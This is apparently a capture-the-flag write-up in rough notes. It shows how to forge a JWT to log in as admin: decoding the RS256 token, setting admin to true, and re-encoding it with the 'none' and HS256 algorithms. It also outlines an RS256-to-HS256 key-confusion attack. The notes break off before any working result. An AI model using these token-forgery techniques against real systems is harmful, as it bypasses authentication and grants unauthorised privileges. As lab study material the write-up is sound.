- this is the jwt token
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/c509f7a5-c54b-4c3a-a913-63000d606f8a)
- it is using rs256
- when we try to register as admin it says user already existed
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/6fe8c79b-99c1-48a7-924f-ae6f0cec472d)
- so our goal would be to login as admin
- and also
```
{
  "user": "user1",
  "public_id": "eebe4bd7-9c44-4c84-a9bb-dad336c8de5e",
  "admin": false,
  "exp": 1713093336
}
```
here we see admin:false
we can make it true
```
C:\home\radha> echo 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9'|base64 -d
{"alg":"RS256","typ":"JWT"}                                                                                
C:\home\radha> echo '{"alg":"None","typ":"JWT"}'|base64
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0K


C:\home\radha> echo 'eyJ1c2VyIjoidXNlcjEiLCJwdWJsaWNfaWQiOiJlZWJlNGJkNy05YzQ0LTRjODQtYTliYi1kYWQzMzZjOGRlNWUiLCJhZG1pbiI6ZmFsc2UsImV4cCI6MTcxMzA5MzMzNn0='|base64 -d 
{"user":"user1","public_id":"eebe4bd7-9c44-4c84-a9bb-dad336c8de5e","admin":false,"exp":1713093336}
                                                                           
C:\home\radha> echo '{"user":"user1","public_id":"eebe4bd7-9c44-4c84-a9bb-dad336c8de5e","admin":true,"exp":1713093336}'|base64
eyJ1c2VyIjoidXNlcjEiLCJwdWJsaWNfaWQiOiJlZWJlNGJkNy05YzQ0LTRjODQtYTliYi1kYWQz
MzZjOGRlNWUiLCJhZG1pbiI6dHJ1ZSwiZXhwIjoxNzEzMDkzMzM2fQo=

eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0K.eyJ1c2VyIjoidXNlcjEiLCJwdWJsaWNfaWQiOiJlZWJlNGJkNy05YzQ0LTRjODQtYTliYi1kYWQz
MzZjOGRlNWUiLCJhZG1pbiI6dHJ1ZSwiZXhwIjoxNzEzMDkzMzM2fQo.

```
![image](https://github.com/m0wn1ka/ctf/assets/127676379/351b175b-4fde-42bc-8ee6-eb8894e572f7)
- so it is not accepting none
```
{"message":"Invalid tokenThe specified alg value is not allowed"}
```
- there is another case rsa uses a pair of cases public and private
- uses private key to sign and public key to verify
- as we have access to public key we can sign our data with this key and say the algorith is hs256(symmetric enc)
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/9718b95b-6bbb-49f2-a7de-326096ffe668)
## try with none
```
C:\home\radha> echo '{"alg":"none","typ":"JWT"}'|base64
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K

eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJ1c2VyIjoidXNlcjEiLCJwdWJsaWNfaWQiOiJlZWJlNGJkNy05YzQ0LTRjODQtYTliYi1kYWQzMzZjOGRlNWUiLCJhZG1pbiI6dHJ1ZSwiZXhwIjoxNzEzMDkzMzM2fQo.
```
## try with type:hs256 without signature
```
C:\home\radha> echo '{"alg":"HS256","typ":"JWT"}'|base64
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9Cg==

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9Cg.eyJ1c2VyIjoidXNlcjEiLCJwdWJsaWNfaWQiOiJlZWJlNGJkNy05YzQ0LTRjODQtYTliYi1kYWQzMzZjOGRlNWUiLCJhZG1pbiI6ZmFsc2UsImV4cCI6MTcxMzA5MzMzNn0.
